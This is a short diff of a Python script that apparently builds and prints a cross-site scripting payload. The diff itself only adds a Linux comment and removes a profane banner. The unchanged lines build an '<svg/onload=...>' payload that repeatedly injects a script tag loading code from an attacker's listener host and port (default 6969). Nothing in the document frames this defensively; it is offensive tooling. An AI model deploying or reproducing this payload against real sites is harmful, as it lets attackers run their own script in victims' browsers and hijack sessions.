@@ -1,3 +1,5 @@
+### This is for linux
+###
 #!/usr/bin/env python3
 import socket
 import os
@@ -47,13 +49,6 @@ LP = '6969'
 userinput = input('%s %s%s%s : Want to use the default LPORT? [Y or N] ' % (que, red, LP, end)).lower()
 if userinput == 'n':
     LP = input('%s ENTER YOUR CUSTOM LPORT:- ' % que)
-print(' ')
-print(' =======================================')
-print('       PASTE YOUR FVCK!NQ P4YL04D' )
-print(' =======================================')
-print('           | | | | | | | | | ')
-print('           v v v v v v v v v')
-print(' ')
 brutelogicpayload = '<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},100);>\n' % (LH, LP)
 print(brutelogicpayload)
 print('%s Execution Pending....' % run)
